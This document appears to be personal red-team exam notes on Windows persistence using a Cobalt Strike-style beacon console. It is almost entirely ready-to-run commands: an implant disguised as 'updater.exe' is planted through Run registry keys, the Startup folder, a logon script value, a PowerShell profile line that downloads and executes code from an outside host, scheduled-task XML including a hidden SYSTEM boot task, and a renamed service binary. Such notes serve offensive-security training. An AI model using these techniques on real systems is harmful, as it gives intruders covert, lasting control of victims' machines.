# Persistence

## Low Priv User

```powershell
# Boot & Logon autostart
beacon> cd C:\Users\pchilds\AppData\Local\Microsoft\WindowsApps
beacon> upload C:\Payloads\http_x64.exe
beacon> mv http_x64.exe updater.exe

beacon> reg_set HKCU Software\Microsoft\Windows\CurrentVersion\Run Updater REG_EXPAND_SZ %LOCALAPPDATA%\Microsoft\WindowsApps\updater.exe


# Startup folder
beacon> cd C:\Users\pchilds\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
beacon> upload C:\Payloads\http_x64.exe
beacon> mv http_x64.exe updater.exe

# Logon Script
beacon> reg_set HKCU Environment UserInitMprLogonScript REG_EXPAND_SZ %USERPROFILE%\AppData\Local\Microsoft\WindowsApps\updater.exe

# Powershell profile
beacon> mkdir C:\Users\pchilds\Documents\WindowsPowerShell
beacon> cd C:\Users\pchilds\Documents\WindowsPowerShell

$_ = Start-Job -ScriptBlock { iex (new-object net.webclient).downloadstring("http://bleepincomputer.com/a") }
beacon> upload C:\Payloads\Profile.ps1

# Scheduled task
beacon> schtaskscreate \Beacon XML CREATE
# Now fill this xml file
<Task xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <Triggers>
    <LogonTrigger>
      <Enabled>true</Enabled>
      <UserId>CONTOSO\pchilds</UserId>
    </LogonTrigger>
  </Triggers>
  <Principals>
    <Principal>
      <UserId>CONTOSO\pchilds</UserId>
    </Principal>
  </Principals>
  <Settings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
  </Settings>
  <Actions>
    <Exec>
      <Command>%LOCALAPPDATA%\Microsoft\WindowsApps\updater.exe</Command>
    </Exec>
  </Actions>
</Task>


# COM Hijacking
Not doing it in exam for sure
```

## Elevated Persistence

```powershell
# Scheduled task
beacon> schtaskscreate \Beacon XML CREATE
# Use this code
<Task xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
	<Triggers>
		<BootTrigger>
			<Enabled>true</Enabled>
		</BootTrigger>
	</Triggers>
	<Principals>
		<Principal>
			<UserId>NT AUTHORITY\SYSTEM</UserId>
			<RunLevel>HighestAvailable</RunLevel>
		</Principal>
	</Principals>
	<Settings>
		<AllowStartOnDemand>true</AllowStartOnDemand>
		<Enabled>true</Enabled>
		<Hidden>true</Hidden>
	</Settings>
	<Actions>
		<Exec>
			<Command>C:\Windows\System32\beacon_x64.exe</Command>
		</Exec>
	</Actions>
</Task>


# Windows service
beacon> cd C:\Windows\System32\
beacon> upload C:\Payloads\beacon_x64.svc.exe
beacon> mv beacon_x64.svc.exe debug_svc.exe

beacon> sc_qc dbgsvc
```